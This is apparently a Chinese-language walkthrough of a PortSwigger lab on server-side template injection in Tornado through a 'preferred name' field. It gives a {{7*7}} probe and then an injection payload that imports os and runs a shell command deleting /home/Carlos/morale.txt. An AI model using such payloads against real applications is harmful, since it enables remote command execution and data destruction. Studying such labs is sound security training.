实验提示，Tornado模板。

详细了解“首选名称”功能。



首选名称功能处，使用了对象引用的语法，可能存在模板注入

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/portswigger-labs/模板注入/images/C5792D8314E246A8B876ADE54E2BADA9clipboard.png)



payload:

```javascript
{{7*7}}
```



发现会在评论处的姓名中出现预想的49

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/portswigger-labs/模板注入/images/A292BBE457A540018053828A5ADC48A4clipboard.png)

说明存在ssti



采用命令执行删除Carlos/morale.txt

paylod:

```javascript
=user.name}}{`%`25+import+os+%25}{`{`os.system('rm%20/home/Carlos/morale.txt')
```

